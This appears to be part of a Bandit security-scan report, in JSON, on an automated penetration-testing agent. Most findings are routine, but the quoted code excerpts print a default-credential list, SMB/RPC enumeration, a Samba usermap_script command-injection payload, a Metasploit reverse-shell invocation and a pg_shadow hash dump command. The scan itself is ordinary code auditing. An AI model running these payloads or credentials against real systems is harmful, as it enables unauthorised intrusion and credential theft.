+      "code": "79     \"smb\": [\n80         {\"username\": \"guest\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"SMB guest \u8bbf\u95ee\"},\n81         {\"username\": \"administrator\", \"password\": \"admin\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 80,
+      "line_range": [
+        80
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "80         {\"username\": \"guest\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"SMB guest \u8bbf\u95ee\"},\n81         {\"username\": \"administrator\", \"password\": \"admin\", \"source\": \"builtin\"},\n82     ],\n",
+      "col_offset": 38,
+      "end_col_offset": 48,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 81,
+      "line_range": [
+        81
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "83     \"redis\": [\n84         {\"username\": \"\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"Redis \u9ed8\u8ba4\u65e0\u5bc6\u7801\"},\n85     ],\n",
+      "col_offset": 25,
+      "end_col_offset": 35,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 84,
+      "line_range": [
+        84
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "86     \"mongodb\": [\n87         {\"username\": \"\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"MongoDB \u9ed8\u8ba4\u65e0\u8ba4\u8bc1\"},\n88     ],\n",
+      "col_offset": 25,
+      "end_col_offset": 35,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 87,
+      "line_range": [
+        87
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "89     \"web\": [\n90         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n91         {\"username\": \"admin\", \"password\": \"password\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 90,
+      "line_range": [
+        90
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "90         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n91         {\"username\": \"admin\", \"password\": \"password\", \"source\": \"builtin\"},\n92         {\"username\": \"admin\", \"password\": \"123456\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'password'",
+      "line_number": 91,
+      "line_range": [
+        91
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "91         {\"username\": \"admin\", \"password\": \"password\", \"source\": \"builtin\"},\n92         {\"username\": \"admin\", \"password\": \"123456\", \"source\": \"builtin\"},\n93         {\"username\": \"admin\", \"password\": \"admin123\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: '123456'",
+      "line_number": 92,
+      "line_range": [
+        92
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "92         {\"username\": \"admin\", \"password\": \"123456\", \"source\": \"builtin\"},\n93         {\"username\": \"admin\", \"password\": \"admin123\", \"source\": \"builtin\"},\n94     ],\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin123'",
+      "line_number": 93,
+      "line_range": [
+        93
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "95     \"printer\": [\n96         {\"username\": \"admin\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"HP/Canon \u6253\u5370\u673a\u9ed8\u8ba4\"},\n97         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 96,
+      "line_range": [
+        96
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "96         {\"username\": \"admin\", \"password\": \"\", \"source\": \"builtin\", \"note\": \"HP/Canon \u6253\u5370\u673a\u9ed8\u8ba4\"},\n97         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n98     ],\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 97,
+      "line_range": [
+        97
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "99     \"ipmi\": [\n100         {\"username\": \"ADMIN\", \"password\": \"ADMIN\", \"source\": \"builtin\", \"note\": \"IPMI \u9ed8\u8ba4\"},\n101         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'ADMIN'",
+      "line_number": 100,
+      "line_range": [
+        100
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "100         {\"username\": \"ADMIN\", \"password\": \"ADMIN\", \"source\": \"builtin\", \"note\": \"IPMI \u9ed8\u8ba4\"},\n101         {\"username\": \"admin\", \"password\": \"admin\", \"source\": \"builtin\"},\n102     ],\n",
+      "col_offset": 30,
+      "end_col_offset": 40,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'admin'",
+      "line_number": 101,
+      "line_range": [
+        101
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "211             })\n212             with urllib.request.urlopen(req, timeout=self.timeout) as resp:\n213                 return resp.read().decode(\"utf-8\", errors=\"replace\")\n",
+      "col_offset": 17,
+      "end_col_offset": 66,
+      "filename": "app\\services\\online_search\\default_creds_client.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 22,
+        "link": "https://cwe.mitre.org/data/definitions/22.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Audit url open for permitted schemes. Allowing use of file:/ or custom schemes is often unexpected.",
+      "line_number": 212,
+      "line_range": [
+        212
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b310-urllib-urlopen",
+      "test_id": "B310",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "233             })\n234             with urllib.request.urlopen(req, timeout=self.timeout) as resp:\n235                 return resp.read().decode(\"utf-8\", errors=\"replace\")\n",
+      "col_offset": 17,
+      "end_col_offset": 66,
+      "filename": "app\\services\\online_search\\msf_module_client.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 22,
+        "link": "https://cwe.mitre.org/data/definitions/22.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Audit url open for permitted schemes. Allowing use of file:/ or custom schemes is often unexpected.",
+      "line_number": 234,
+      "line_range": [
+        234
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b310-urllib-urlopen",
+      "test_id": "B310",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "90                 req = self._build_request(url)\n91                 with urllib.request.urlopen(req, timeout=self.timeout) as resp:\n92                     if resp.status == 429:\n",
+      "col_offset": 21,
+      "end_col_offset": 70,
+      "filename": "app\\services\\online_search\\nvd_client.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 22,
+        "link": "https://cwe.mitre.org/data/definitions/22.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Audit url open for permitted schemes. Allowing use of file:/ or custom schemes is often unexpected.",
+      "line_number": 91,
+      "line_range": [
+        91
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b310-urllib-urlopen",
+      "test_id": "B310",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "943             state.add_milestone(\"phase_transition\", \"reflection \u2192 done: \u53cd\u601d\u5b8c\u6210\")\n944         except Exception:\n945             pass\n946     except Exception as exc:\n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 944,
+      "line_range": [
+        944,
+        945
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "1504                 args = make_args()\n1505             except Exception:\n1506                 continue\n1507             purpose = f\"LLM \u5728\u601d\u8003\u4e2d\u63d0\u53ca\u4f7f\u7528 {tool_name}\"\n",
+      "col_offset": 12,
+      "end_col_offset": 24,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Continue detected.",
+      "line_number": 1505,
+      "line_range": [
+        1505,
+        1506
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b112_try_except_continue.html",
+      "test_id": "B112",
+      "test_name": "try_except_continue"
+    },
+    {
+      "code": "5353             suggestions.append(\n5354                 f\"shell: mysql -h {state.data.get('targets',[''])[0]} -u root -e 'select user(),version()' 2>/dev/null; \"\n5355                 f\"psql -h {state.data.get('targets',[''])[0]} -U postgres -c 'SELECT usename, passwd FROM pg_shadow' 2>/dev/null\"\n5356             )\n",
+      "col_offset": 18,
+      "end_col_offset": 34,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "LOW",
+      "issue_cwe": {
+        "id": 89,
+        "link": "https://cwe.mitre.org/data/definitions/89.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Possible SQL injection vector through string-based query construction.",
+      "line_number": 5354,
+      "line_range": [
+        5354,
+        5355
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b608_hardcoded_sql_expressions.html",
+      "test_id": "B608",
+      "test_name": "hardcoded_sql_expressions"
+    },
+    {
+      "code": "5470                             svc_info = banner[:200]\n5471                     except Exception:\n5472                         pass\n5473                 s.close()\n",
+      "col_offset": 20,
+      "end_col_offset": 28,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 5471,
+      "line_range": [
+        5471,
+        5472
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "5473                 s.close()\n5474             except Exception:\n5475                 pass\n5476 \n",
+      "col_offset": 12,
+      "end_col_offset": 20,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 5474,
+      "line_range": [
+        5474,
+        5475
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "5488     # \u2500\u2500 HTTP \u63a2\u6d4b\uff1a\u5bf9\u6240\u6709\u975e HTTP \u7aef\u53e3\u5c1d\u8bd5 curl\uff0c\u4fee\u6b63\u670d\u52a1\u8bc6\u522b \u2500\u2500\n5489     import subprocess as _sp\n5490     for finding in findings:\n",
+      "col_offset": 4,
+      "end_col_offset": 28,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Consider possible security implications associated with the subprocess module.",
+      "line_number": 5489,
+      "line_range": [
+        5489
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess",
+      "test_id": "B404",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "5506         try:\n5507             r = _sp.run(\n5508                 [\"curl\", \"-s\", \"-o\", \"/dev/null\", \"-w\", \"%{http_code}\", \"-m\", \"3\",\n5509                  f\"http://{target}:{port}/\"],\n5510                 capture_output=True, text=True, timeout=5)\n5511             http_code = r.stdout.strip()\n",
+      "col_offset": 16,
+      "end_col_offset": 58,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Starting a process with a partial executable path",
+      "line_number": 5507,
+      "line_range": [
+        5507,
+        5508,
+        5509,
+        5510
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html",
+      "test_id": "B607",
+      "test_name": "start_process_with_partial_path"
+    },
+    {
+      "code": "5506         try:\n5507             r = _sp.run(\n5508                 [\"curl\", \"-s\", \"-o\", \"/dev/null\", \"-w\", \"%{http_code}\", \"-m\", \"3\",\n5509                  f\"http://{target}:{port}/\"],\n5510                 capture_output=True, text=True, timeout=5)\n5511             http_code = r.stdout.strip()\n",
+      "col_offset": 16,
+      "end_col_offset": 58,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 5507,
+      "line_range": [
+        5507,
+        5508,
+        5509,
+        5510
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "5518                      port=port, http_code=http_code)\n5519         except Exception:\n5520             pass\n5521 \n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 5519,
+      "line_range": [
+        5519,
+        5520
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "6148                     if judged.service == \"postgres\":\n6149                         state.add_credential(\"postgres\", password=\"postgres\", source=f\"direct_{judged.service}_{port}\", kind=\"validated\")\n6150                     elif judged.service == \"mysql\":\n",
+      "col_offset": 24,
+      "end_col_offset": 137,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'postgres'",
+      "line_number": 6149,
+      "line_range": [
+        6149
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b106_hardcoded_password_funcarg.html",
+      "test_id": "B106",
+      "test_name": "hardcoded_password_funcarg"
+    },
+    {
+      "code": "6150                     elif judged.service == \"mysql\":\n6151                         state.add_credential(\"root\", password=\"\", source=f\"direct_{judged.service}_{port}\", kind=\"validated\")\n6152                     elif judged.service == \"tomcat\":\n",
+      "col_offset": 24,
+      "end_col_offset": 125,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 6151,
+      "line_range": [
+        6151
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b106_hardcoded_password_funcarg.html",
+      "test_id": "B106",
+      "test_name": "hardcoded_password_funcarg"
+    },
+    {
+      "code": "6155                 elif is_host_compromise:\n6156                     state.add_credential(\"root\", password=\"\", source=f\"direct_shell_{port}\", kind=\"shell_obtained\")\n6157             executed += 1\n",
+      "col_offset": 20,
+      "end_col_offset": 115,
+      "filename": "app\\services\\pentest_agent\\agent.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 6156,
+      "line_range": [
+        6156
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b106_hardcoded_password_funcarg.html",
+      "test_id": "B106",
+      "test_name": "hardcoded_password_funcarg"
+    },
+    {
+      "code": "660     [\"smbclient\", \"-L\", \"{ip}\", \"-N\", \"--timeout=10\"],\n661     [\"smbclient\", \"//{ip}/tmp\", \"-N\", \"-c\", \"ls\", \"--timeout=10\"],\n662     [\"smbclient\", \"//{ip}/IPC$\", \"-N\", \"-c\", \"ls\", \"--timeout=10\"],\n663 ]:\n664     try:\n665         r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n666         out = (r.stdout + r.stderr).strip()\n667         if out and \"error\" not in out.lower()[:50]:\n668             print(f\"SMB_ENUM: {{out[:500]}}\")\n669             found_shares = True\n670     except Exception as e:\n671         print(f\"smbclient error: {{e}}\")\n672 \n673 # \u65b9\u6cd52: rpcclient \u533f\u540d\u7528\u6237\u679a\u4e3e\n674 for rpc_cmd in [\n675     [\"rpcclient\", \"-U\", \"\", \"{ip}\", \"-c\", \"enumusers\"],\n676     [\"rpcclient\", \"-U\", \"\", \"{ip}\", \"-c\", \"querydominfo\"],\n677     [\"rpcclient\", \"-U\", \"%\", \"{ip}\", \"-c\", \"enumusers\"],\n678 ]:\n679     try:\n680         r = subprocess.run(rpc_cmd, capture_output=True, text=True, timeout=10,\n681                           input=\"\\\\n\")\n682         out = (r.stdout + r.stderr).strip()\n683         if out and \"failed\" not in out.lower()[:50]:\n684             print(f\"RPC_ENUM: {{out[:500]}}\")\n685             found_shares = True\n686     except Exception as e:\n687         pass\n688 \n689 # \u65b9\u6cd53: Samba usermap_script (CVE-2007-2447) \u2014 \u901a\u8fc7 smbclient \u7684 -c \u53c2\u6570\u6ce8\u5165\n690 # \u4f7f\u7528 /=`id` \u8bed\u6cd5\u6ce8\u5165\u547d\u4ee4\n691 for inject_cmd in [\"/=`id`\", \"/=`whoami`\"]:\n692     try:\n693         r = subprocess.run(\n694             [\"smbclient\", \"//{ip}/tmp\", \"-N\", \"-c\", f\"ls {{inject_cmd}}\"],\n695             capture_output=True, text=True, timeout=10)\n696         out = (r.stdout + r.stderr).strip()\n697         if \"uid=\" in out or \"root\" in out:\n698             print(f\"SAMBA_USERMAP_OK: {{out[:500]}}\")\n699             found_shares = True\n700             break\n701     except:\n702         pass\n703 \n704 if not found_shares:\n705     print(\"SAMBA_ENUM_FAILED\")\n706 \n707 # Metasploit usermap_script fallback gives a command-shell proof when the\n708 # target permits the historical injection but smbclient only exposes shares.\n709 try:\n710     probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n711     probe.connect((\"{ip}\", {port}))\n712     lhost = probe.getsockname()[0]\n713     probe.close()\n714     lport = 4400 + ({port} % 100)\n715     msf = (\"use exploit/multi/samba/usermap_script; set RHOSTS {ip}; \"\n716            \"set RPORT {port}; set PAYLOAD cmd/unix/reverse_perl; \"\n717            \"set LHOST \" + lhost + \"; set LPORT \" + str(lport) + \"; \"\n718            \"exploit -j; sleep 5; sessions -l; exit -y\")\n719     r = subprocess.run([\"msfconsole\", \"-q\", \"-x\", msf],\n720                        capture_output=True, text=True, timeout=60)\n721     out = (r.stdout + r.stderr).strip()\n722     if \"active sessions\" in out.lower() and \"shell\" in out.lower():\n723         print(\"SAMBA_USERMAP_MSF_SESSION_OK\")\n724     print(f\"SAMBA_MSF: {{out[-1200:]}}\")\n725 except Exception as e:\n726     print(f\"SAMBA_MSF_ERROR: {{e}}\")\n727 '''\n728 \n729 \n730 def _py_rlogin_rsh(ip: str, port: int) -> str:\n731     \"\"\"rlogin/rsh \u514d\u5bc6\u767b\u5f55\u3002\"\"\"\n732     return f'''\\\n733 import subprocess\n734 \n735 for cmd in [\n736     [\"rsh\", \"-l\", \"root\", \"{ip}\", \"id\"],\n",
+      "col_offset": 25,
+      "end_col_offset": 21,
+      "filename": "app\\services\\pentest_agent\\direct_exploits.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 377,
+        "link": "https://cwe.mitre.org/data/definitions/377.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Probable insecure usage of temp file/directory.",
+      "line_number": 661,
+      "line_range": [
+        653,
+        654,
+        655,
+        656,
+        657,
+        658,
+        659,
+        660,
+        661,
+        662,
+        663,
+        664,
+        665,
+        666,
+        667,
+        668,
+        669,
+        670,
+        671,
+        672,
+        673,
+        674,
+        675,
+        676,
+        677,
+        678,
+        679,
+        680,
+        681,
+        682,
+        683,
+        684,
+        685,
+        686,
+        687,
+        688,
+        689,
+        690,
+        691,
+        692,
+        693,
+        694,
+        695,
+        696,
+        697,
+        698,
+        699,
+        700,
+        701,
+        702,
+        703,
+        704,
+        705,
+        706,
+        707,
+        708,
+        709,
+        710,
+        711,
+        712,
+        713,
+        714,
+        715,
+        716,
+        717,
+        718,
+        719,
+        720,
+        721,
+        722,
+        723,
+        724,
+        725,
+        726,
+        727
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b108_hardcoded_tmp_directory.html",
+      "test_id": "B108",
+      "test_name": "hardcoded_tmp_directory"
+    },
+    {
+      "code": "693         r = subprocess.run(\n694             [\"smbclient\", \"//{ip}/tmp\", \"-N\", \"-c\", f\"ls {{inject_cmd}}\"],\n695             capture_output=True, text=True, timeout=10)\n696         out = (r.stdout + r.stderr).strip()\n697         if \"uid=\" in out or \"root\" in out:\n698             print(f\"SAMBA_USERMAP_OK: {{out[:500]}}\")\n699             found_shares = True\n700             break\n701     except:\n702         pass\n703 \n704 if not found_shares:\n705     print(\"SAMBA_ENUM_FAILED\")\n706 \n707 # Metasploit usermap_script fallback gives a command-shell proof when the\n708 # target permits the historical injection but smbclient only exposes shares.\n709 try:\n710     probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n711     probe.connect((\"{ip}\", {port}))\n712     lhost = probe.getsockname()[0]\n713     probe.close()\n714     lport = 4400 + ({port} % 100)\n715     msf = (\"use exploit/multi/samba/usermap_script; set RHOSTS {ip}; \"\n716            \"set RPORT {port}; set PAYLOAD cmd/unix/reverse_perl; \"\n717            \"set LHOST \" + lhost + \"; set LPORT \" + str(lport) + \"; \"\n718            \"exploit -j; sleep 5; sessions -l; exit -y\")\n719     r = subprocess.run([\"msfconsole\", \"-q\", \"-x\", msf],\n720                        capture_output=True, text=True, timeout=60)\n721     out = (r.stdout + r.stderr).strip()\n722     if \"active sessions\" in out.lower() and \"shell\" in out.lower():\n723         print(\"SAMBA_USERMAP_MSF_SESSION_OK\")\n724     print(f\"SAMBA_MSF: {{out[-1200:]}}\")\n725 except Exception as e:\n726     print(f\"SAMBA_MSF_ERROR: {{e}}\")\n727 '''\n728 \n729 \n730 def _py_rlogin_rsh(ip: str, port: int) -> str:\n731     \"\"\"rlogin/rsh \u514d\u5bc6\u767b\u5f55\u3002\"\"\"\n732     return f'''\\\n733 import subprocess\n734 \n735 for cmd in [\n736     [\"rsh\", \"-l\", \"root\", \"{ip}\", \"id\"],\n737     [\"rlogin\", \"-l\", \"root\", \"{ip}\"],\n738 ]:\n739     try:\n740         r = subprocess.run(cmd, capture_output=True, text=True, timeout=8)\n741         out = (r.stdout + r.stderr).strip()\n742         if out:\n743             print(f\"RLOGIN_RESULT: {{out}}\")\n744             if \"uid=\" in out or \"root\" in out:\n745                 print(\"RLOGIN_SHELL_OK\")\n746                 break\n747     except Exception as e:\n748         print(f\"rlogin error: {{e}}\")\n749 else:\n750     print(\"RLOGIN_FAILED\")\n751 '''\n752 \n753 \n754 def _py_vnc_bruteforce(ip: str, port: int) -> str:\n755     \"\"\"VNC \u5f31\u53e3\u4ee4\u5c1d\u8bd5 + banner \u8bfb\u53d6\u3002\n756 \n757     \u5148\u8bfb\u53d6 RFB banner \u786e\u8ba4\u670d\u52a1\u8fd0\u884c\uff0c\u7136\u540e\u5c1d\u8bd5\u5e38\u89c1\u5bc6\u7801\u3002\n758     \"\"\"\n759     return f'''\\\n760 import socket\n761 \n762 # \u8bfb\u53d6 VNC banner (RFB \u534f\u8bae)\n763 try:\n764     s = socket.socket(); s.settimeout(5); s.connect((\"{ip}\", {port}))\n765     banner = s.recv(1024).decode(errors=\"replace\").strip()\n766     print(f\"VNC_BANNER: {{banner}}\")\n767     s.close()\n768     if \"RFB\" in banner:\n769         print(\"VNC_SERVICE_CONFIRMED\")\n",
+      "col_offset": 33,
+      "end_col_offset": 20,
+      "filename": "app\\services\\pentest_agent\\direct_exploits.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 377,
+        "link": "https://cwe.mitre.org/data/definitions/377.html"
+      },
+      "issue_severity": "MEDIUM",
